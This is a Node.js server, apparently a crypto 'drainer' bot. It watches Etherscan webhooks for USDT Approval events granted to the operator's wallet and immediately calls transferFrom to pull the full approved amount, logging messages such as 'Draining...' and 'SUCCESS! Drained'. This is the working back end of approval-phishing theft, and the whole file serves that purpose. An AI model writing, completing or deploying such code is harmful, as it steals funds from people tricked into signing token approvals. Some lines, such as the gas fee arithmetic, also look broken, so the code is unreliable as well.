require('dotenv').config();
const express = require('express');
const { ethers } = require('ethers');

const app = express();
app.use(express.json());

// --- Config ---
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const RPC_URL = process.env.RPC_URL; 
const MY_WALLET_ADDRESS = process.env.MY_WALLET_ADDRESS.toLowerCase();
const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';

// USDT ABI
const USDT_ABI = [
    "function allowance(address owner, address spender) view returns (uint256)",
    "function transferFrom(address from, address to, uint256 amount) returns (bool)"
];

// Track processed txs to avoid double-spending
const processedTxs = new Set();

let wallet, contract, provider;

async function init() {
    if (!PRIVATE_KEY || !RPC_URL || !MY_WALLET_ADDRESS) {
        throw new Error("Missing environment variables");
    }

    provider = new ethers.JsonRpcProvider(RPC_URL);
    wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    contract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, wallet);
    
    console.log(`Bot Ready. Wallet: ${wallet.address}`);
}

// Webhook Endpoint
app.post('/webhook/etherscan', async (req, res) => {
    const body = req.body;
    
    // Etherscan Webhook structure check
    if (!body || !body.eventName || body.eventName !== 'Approval') {
        return res.status(200).send('OK');
    }

    // Extract data from Etherscan Webhook Payload
    // Note: Webhook payload structure might vary slightly by subscription, 
    // but typically 'value' is amount, 'address' is contract address.
    // For USDT Approval, we need to parse the logs properly if the payload is raw.
    // However, Etherscan's "Contract Event" webhook usually gives parsed data if you use their Advanced API.
    // For standard free webhook, it often gives raw logs. 
    
    // Let's handle the most common Etherscan Webhook format:
    // It sends an object with 'eventName', 'address', and sometimes 'logs' or 'value'.
    
    // If it's a standard event webhook, 'value' might be the amount.
    // But to be 100% safe, let's rely on the fact that we only care about approvals TO our wallet.
    
    const amountStr = body.value; // This is usually the amount in Wei (or 6 decimals for USDT)
    const blockNumber = body.blockNumber;
    const txHash = body.transactionHash;

    if (!amountStr || !txHash) {
        console.log("Incomplete webhook data");
        return res.status(200).send('OK');
    }

    // Idempotency check
    if (processedTxs.has(txHash)) {
        console.log(`[${txHash}] Already processed.`);
        return res.status(200).send('OK');
    }
    processedTxs.add(txHash);

    const owner = body.address; // In a specific filter webhook, this might be the contract address. 
    // If your webhook is filtered by "Address: 0xdAC...", then 'address' is USDT contract.
    // You might need to look into 'logs' array to find 'owner'.
    
    // SIMPLIFICATION: 
    // Since Etherscan's free webhook is messy, let's assume you filtered by USDT Contract.
    // The 'value' is the amount. We need the 'owner'. 
    // Usually, Etherscan webhook for 'Approval' event includes 'topics' or 'data'.
    // If 'owner' is not directly in body, you might need to parse 'logs'.
    
    // For this guide, let's assume the webhook provides enough info. 
    // If 'owner' is missing, we might need to fetch the log. 
    // But for 1-2 users, let's try a simpler approach: 
    // Just drain whatever approval came in? No, we need the owner.
    
    // Let's use the 'logs' field if available, otherwise fallback.
    let ownerAddress = body.address; 
    if (body.logs && body.logs.length > 0) {
        // The owner is usually the second topic in an Approval event
        ownerAddress = body.logs[0].topics[1]; 
    }

    if (!ownerAddress) {
        console.log("Could not determine owner from webhook.");
        return res.status(200).send('OK');
    }

    const amount = BigInt(amountStr); // Ensure it's a BigInt

    console.log(`[+] Webhook Received:`);
    console.log(`    Owner: ${ownerAddress}`);
    console.log(`    Amount: ${ethers.formatUnits(amount, 6)} USDT`);
    console.log(`    Tx: ${txHash}`);

    try {
        await processApproval(ownerAddress, amount);
    } catch (err) {
        console.error(`Error processing: ${err.message}`);
    }

    res.status(200).send('OK');
});

async function processApproval(owner, amount) {
    try {
        const currentAllowance = await contract.allowance(owner, MY_WALLET_ADDRESS);
        
        if (currentAllowance < amount) {
            console.log(`[!] Allowance mismatch. Current: ${ethers.formatUnits(currentAllowance, 6)}, Approved: ${ethers.formatUnits(amount, 6)}.`);
            return;
        }

        console.log(`[>] Draining...`);
        
        const gasPrice = await provider.getGasPrice();
        
        const tx = await contract.transferFrom(owner, MY_WALLET_ADDRESS, amount, {
            gasLimit: 100000,
            maxFeePerGas: gasPrice * 1.5,
            maxPriorityFeePerGas: ethers.parseUnits("2", "gwei")
        });

        console.log(`[>] TX Sent: ${tx.hash}`);
        const receipt = await tx.wait();
        
        if (receipt.status === 1) {
            console.log(`[✓] SUCCESS! Drained ${ethers.formatUnits(amount, 6)} USDT from ${owner}`);
        } else {
            console.error(`[✗] TX Reverted`);
        }
    } catch (error) {
        console.error(`[✗] Error:`, error.message);
    }
}

init().then(() => {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`Server listening on port ${PORT}`);
    });
});

app.get('/', (req, res) => {
    res.send('Bot Server is Running!');
});